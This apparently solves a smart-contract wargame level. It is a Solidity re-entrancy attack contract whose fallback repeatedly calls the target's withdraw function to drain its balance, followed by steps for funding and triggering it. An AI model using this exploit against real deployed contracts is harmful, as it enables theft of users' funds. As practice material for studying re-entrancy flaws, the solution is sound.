```javascript
pragma solidity ^0.6.0;

contract ReentranceAttack {
    address payable public attack_addr;
    
    constructor(address payable addr) payable {
        attack_addr = addr;
    }
    
    function donate() public {
        attack_addr.call{value:1000000000000000}(abi.encodeWithSignature("donate(address)", address(this)));
    }
    
    function attack() public {
        (bool success, ) = attack_addr.call(abi.encodeWithSignature("withdraw(uint256)", 1000000000000000));
        require(success);
    }
    
    fallback() external payable {
        if (address(attack_addr).balance >= 1000000000000000) {
            (bool success, ) = attack_addr.call(abi.encodeWithSignature("withdraw(uint256)", 1000000000000000));
            require(success);
        }
    }

    function destroy(address payable addr) public {
        selfdestruct(addr);
    }
}
```

First initialize the contract with `2000000000000000 wei`. Then, call `donate` to deposit `1000000000000000 wei`. Finally, call `attack` to do the re-entrancy attack to keep siphoning the fund out of the level's contract.